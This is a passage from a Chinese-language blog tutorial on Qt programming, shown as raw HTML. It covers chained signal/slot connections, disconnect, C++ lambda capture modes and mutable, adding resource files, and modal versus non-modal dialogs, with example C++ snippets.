&amp;x_hong, pAck);</span><br><span class="line">    w.<span class="built_in">show</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.<span class="built_in">exec</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处稍微修改了下按钮的创建时机，show在widget里面设置了。</p><img src="/2021/09/06/qt/007.png" class=""><p>效果是有的，不过同样存在一个小问题，无法带参数，因为这个clicked是个bool类型的，她不像我们可以通过函数指针去匹配带参数，这个人家自定义好的我们没法改。<br>这个特色就是连锁的connect，将信号绑定一个信号，再用这个信号触发我们的槽。</p><p>那么换个玩法，套个娃</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"></span><br><span class="line">QPushButton* btn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">    , <span class="built_in">x_ming</span>(<span class="keyword">this</span>)</span><br><span class="line">    , <span class="built_in">x_hong</span>(<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn-&gt;<span class="built_in">setText</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">resize</span>(<span class="number">200</span>,<span class="number">220</span>);</span><br><span class="line">    btn-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">200</span>);</span><br><span class="line">    <span class="built_in">void</span>(boy::*pLove)() = &amp;boy::love;</span><br><span class="line">    <span class="built_in">void</span>(gril::*pAck)() = &amp;gril::ack_love;</span><br><span class="line">    <span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line">    <span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line">    <span class="built_in">connect</span>(btn,&amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br><span class="line">    btn-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">    <span class="keyword">delete</span> btn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让按钮先通过点击信号触发boy的love信号，再用love触发gril的ack槽，最后btn通过点击信号关闭窗口。</p><blockquote><p>x_ming和x_hong的定义放在头文件了</p></blockquote><p>最后还有一个断开连接，信号和槽能连接自然也能断开<br><code>disconnect</code>可以将信号断开连接，使用方式和连接一样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br><span class="line"><span class="built_in">connect</span>(&amp;x_ming, pLove, &amp;x_hong, pAck);</span><br><span class="line"><span class="built_in">connect</span>(btn,&amp;QPushButton::clicked, <span class="keyword">this</span>, &amp;Widget::close);</span><br><span class="line"><span class="built_in">disconnect</span>(btn,&amp;QPushButton::clicked, &amp;x_ming, pLove);</span><br></pre></td></tr></table></figure><p>加上这一一句，最开始的btn触发plove就失效了，那么后面的通过plove触发pack自然也不存在了。</p><p>所以我们得到结论</p><ul><li>多个信号可以连接同一个槽函数</li><li>信号和槽的参数必须要一一对应</li></ul><hr><h3 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h3><p>有些教程叫Lambda表达式，也有的叫Lambda函数，总之它是一个匿名函数，就是没有名字的函数。<strong>跟函数指针不一样</strong><br>Lambda是c++11引入的新概念，格式：<br><code>[捕捉列表](参数)mutable-&gt;返回值类型，可以不设置&#123;函数体&#125;</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>(<span class="string">&quot;Lambda&quot;</span>);</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure><ol><li>[]，标识一个Lambda函数的开始，不能省略<ul><li>为空时，没有使用任何的函数对象参数</li><li>&#x3D;，函数体内使用Lambda所在范围的局部变量包括类的this传值，都会通过复制一份给Lambda函数</li><li>&amp;，与&#x3D;相似，区别就是&#x3D;是复制，而&amp;是引用，意味着&#x3D;不能修改原来变量的值，而引用可以</li><li>this，函数体内可以使用Lambda所在的内部成员</li><li>a，这里表示一个变量名，指Lambda内拷贝一个变量a使用</li><li>&amp;a，表示表达式内引用变量a</li><li>a,&amp;b 表示拷贝a，引用b</li><li>&#x3D;,&amp;a,&amp;b 表示除了ab引用，其他都拷贝</li><li>&amp;,a,b 表示除了ab拷贝，其余都引用</li></ul></li><li>函数参数，与常规函数规则一致</li><li>mutable，修改关键字，在对应位置处设置关键字，才能修改函数对象参数否则报错。可有可无，必须是有才能修改。lambda默认是const，也就是不能修改本地变量<ul><li>-&gt;return-&gt;type返回值的方式，既然是函数就可能会有返回值，所以-&gt;表示有返回值的函数</li></ul></li><li>函数体就是常规函数内容</li></ol><blockquote><p>为什么要使用Lambda函数，通过上述概念，其实就知道，有些函数只是临时随便用，而且业务逻辑简单，就没有必要特意搞个函数出来，通过Lambda可以简化一些步骤。</p></blockquote><p><strong>使用Lambda，需要保证你编译器支持c++11</strong><br>qt中，你新建的项目中有个.pro的文件，里面能看到</p><p>老样子依旧写个例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn1,*btn2;</span><br><span class="line">    btn1 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn2 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn1-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮1&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮2&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">show</span>();</span><br><span class="line">    btn2-&gt;<span class="built_in">show</span>();</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    <span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">        a += <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/009.png" class=""><p>此处我们使用了<code>=</code>的lambda表达式，但是似乎btn1的改变对于btn2没有影响。先前提到过<code>=</code>只是能够拷贝一个a，但是不能对其改变。</p><p>对于直接传递变量a，和&#x3D;类似，就是拷贝一个变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [a]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [a]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其结果和<code>[=]</code>一样，<code>[=]</code>的范围更大，指定变量肯定范围小。<br><strong>mutable我们后面讲</strong></p><p>要想改变可以通过<code>&amp;</code>引用的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [&amp;]()&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [&amp;]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/010.png" class=""><p>这里倒是改变了，但是如果你在connect后面在打印个a，嘿嘿，就会看到好玩的，原因就是有些东西先编译好了，局部变量也是在栈上操作的。</p><p>那么常见的还有通过this操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn1,*btn2;</span><br><span class="line">    btn1 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn2 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn1-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮1&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮2&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">show</span>();</span><br><span class="line">    btn2-&gt;<span class="built_in">show</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    <span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [<span class="keyword">this</span>]()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;a+=<span class="number">100</span>; </span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [<span class="keyword">this</span>]()&#123;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/008.png" class=""><p>变量a添加在头文件了，变成类成员。所以通过this，我们让按钮1每按下一次就修改一次成员变量a的值，然后btn2打印出来的也是被修改过后的值。</p><blockquote><p>介么一看，其实lambda是不是感觉还挺简单。</p></blockquote><hr><h3 id="Lambda拓展"><a href="#Lambda拓展" class="headerlink" title="Lambda拓展"></a>Lambda拓展</h3><p>也就是之前提到的<code>mutable</code>这个东西。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用了<code>mutable</code>，如果不加，会有报错，提示a是一个只读变量，不能够被修改。<br><strong>所以第一个作用是会使得该“值捕获变量”的值，可以在被捕获的值的基础上进行变化。</strong></p><p><code>mutable-&gt;type&#123;&#125;()</code>的用法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ret = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;ret:&quot;</span> &lt;&lt; ret;</span><br><span class="line">ret = [&amp;]() <span class="keyword">mutable</span>-&gt;<span class="type">int</span>&#123;</span><br><span class="line">    ret *= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;ret:&quot;</span> &lt;&lt; ret;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/012.png" class=""><p>这样一来，一些小算术什么的就可以通过表达式完成。<br>比如斐波那契数列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">0</span>,y=<span class="number">1</span>,z=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    [](<span class="type">int</span>&amp; a,<span class="type">int</span>&amp; b)-&gt;<span class="type">int</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret=a+b;</span><br><span class="line">    a=b;</span><br><span class="line">    b=ret;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; ret;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;(x,y)</span><br></pre></td></tr></table></figure><p>虽然写法可能让人不习惯哈哈</p><img src="/2021/09/06/qt/013.png" class=""><p><strong>它的作用我感觉就是让lambda设置返回值</strong></p><ol><li>-&gt;有这玩意才代表有返回值</li><li>-&gt;后面跟的是返回值类型</li><li>最后的()是调用函数，没有则不是，也就跟上面的相似</li></ol><p>而且吧，对于这个匿名表达式，比较实用的还是像咱这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, [=]()&#123;</span><br><span class="line">    x_ming.<span class="built_in">love</span>(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(&amp;x_ming, (<span class="built_in">void</span>(boy::*)(QString))&amp;boy::love, &amp;x_hong, (<span class="built_in">void</span>(gril::*)(QString))&amp;gril::ack_love);</span><br></pre></td></tr></table></figure><p>这样发个带参数的还好弄点</p><img src="/2021/09/06/qt/014.png" class=""><p>结果也能正常显示。就是会看到男孩说的话多了个双引号，咱传递的时候带双引号是为了表示字符串类型。而打印却多了双引号。<br>这是因为QString，是qt自己封装的，咱常用的字符串以右值形式存在时是<code>const char*</code>，想要去掉这个双引号，就是让QString转为char*类型。在文档里面可以搜到，Qstring有一个方法叫<code>toUtf8</code>返回的是一个QByteArray的字节数组应该是叫，然后搜索这个QByteArray，发现有个叫data的方法返回值是char*，那么就可以在头文件修改一下<br><code>qDebug() &lt;&lt; &quot;男孩:&quot; &lt;&lt; str.toUtf8().data() &lt;&lt; &quot; 女孩:hai&quot;;</code></p><img src="/2021/09/06/qt/015.png" class=""><p>此时在输出就没有双引号了。</p><p>lambda表达式还能代码变得简洁高效，比如咱之前写的按钮点击然后关闭窗口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>并且，如果信号接收者是this，可以直接忽略不写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, [=]()&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h2 id="ui文件"><a href="#ui文件" class="headerlink" title="ui文件"></a>ui文件</h2><p>这就是拖控件用的可视化操作。<br>其实里面好像算是个xml什么的配置信息，双击这个文件会跳到qt的设计师界面，然后就可以拖拽控件了，包括添加子控件的操作。<br>从代码上，我们一般都是要先定义一个控件，比如菜单栏，然后在往里面add菜单。可视化自然是省去了一些步骤。</p><img src="/2021/09/06/qt/019.png" class=""><blockquote><p>不过学习嘛，总是先苦后甜，不能说有方便的就不去了解了。</p></blockquote><hr><h2 id="资源文件添加"><a href="#资源文件添加" class="headerlink" title="资源文件添加"></a>资源文件添加</h2><p>先找到一个带图片或者音频啥的文件，拖到项目路径下，然后在qt里右击项目选择添加新文件</p><img src="/2021/09/06/qt/016.png" class=""><p>名字看着取，尽量有意义。</p><img src="/2021/09/06/qt/017.png" class=""><img src="/2021/09/06/qt/018.png" class=""><p>这里的前缀我们一般习惯用<code>/</code>就行了。<br>然后通过addfiles，去打开这个资源文件，那么他就会把这个路径加载进来。<br>资源文件最好最好最好跟项目打包，别搞什么外面的资源。</p><p>额改了下主题，还是黑色带点感觉哈哈，通过add files之后就能看到多了路径和图片，剩下的就是怎么用，随便举个例子。<br>用之前可以在ui文件下，拖一个Graphics view到窗口上，咱好设置图片。</p><img src="/2021/09/06/qt/021.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::<span class="built_in">MainWindow</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QMainWindow</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QGraphicsScene* scene = <span class="keyword">new</span> QGraphicsScene;</span><br><span class="line">    scene-&gt;<span class="built_in">addPixmap</span>(QPixmap::<span class="built_in">fromImage</span>(<span class="built_in">QImage</span>(<span class="string">&quot;:/images/ASUS.png&quot;</span>)));</span><br><span class="line">    ui-&gt;graphicsView-&gt;<span class="built_in">setScene</span>(scene);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~<span class="built_in">MainWindow</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>从这里的加载资源文件路径可以看到，为什么要把前缀设置成斜杠，这也是比较通俗易懂的方式</strong></p><img src="/2021/09/06/qt/022.png" class=""><blockquote><p>额这里偷个懒没搞大小哈哈，只是说可以在这个控件里直接加载咱们的资源文件。随便演示一下</p></blockquote><hr><h2 id="模态对话框和非模态"><a href="#模态对话框和非模态" class="headerlink" title="模态对话框和非模态"></a>模态对话框和非模态</h2><p>其实可以一句话概括：</p><blockquote><p>模态对话框打开之后，你是没办法对后面的窗口进行操作的；反之，非模态不会独占这个操作，你仍可以对后面或者其他窗口进行操作。    ——首先基于一个软件</p></blockquote><p>模态对话框的场景一般都是一些配置修改，或者文件操作，这种对下层窗口有影响的肯定是要以模态对话框出现。<br>而软件中一般都会有一个版本提示的信息，那个就无关紧要，因为你改变其他的对他不会有啥影响。</p><p>一个小例子：<br>先创建个菜单吧，懒得搞按钮没意思。</p><img src="/2021/09/06/qt/023.png" class=""><p>注意，子菜单要先变成中文可以在属性的text修改</p><img src="/2021/09/06/qt/024.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDialog&gt;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::<span class="built_in">MainWindow</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QMainWindow</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ui指向的这个控件名，在ui文件的这个控件属性中，有个objectname</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew_file, &amp;QAction::triggered, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">       QDialog <span class="built_in">dlg</span>(<span class="keyword">this</span>);</span><br><span class="line">       dlg.<span class="built_in">exec</span>();  <span class="comment">//模态化</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~<span class="built_in">MainWindow</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/025.png" class=""><p>因为没有设置大小姑且这样看，建议自己尝试一下。</p><p>非模态的显示就是方法不同，不过因为我们设置在lambda中，所以生命周期结束得太快了会一闪而过，只能通过new到堆区上活的久一些。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(ui-&gt;actionnew_file, &amp;QAction::triggered, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    QDialog* dlg = <span class="keyword">new</span> <span class="built_in">QDialog</span>(<span class="keyword">this</span>);</span><br><span class="line">    dlg-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里比较有意思的是，因为非模态没有阻塞的效果，所以你新建可以创建好多个窗口。</p><ul><li>qt的dialog不止这一种</li><li>这个dialog其实还有挺多可以设置的</li></ul><hr><h2 id="关于中文乱码"><a href="#关于中文乱码" class="headerlink" 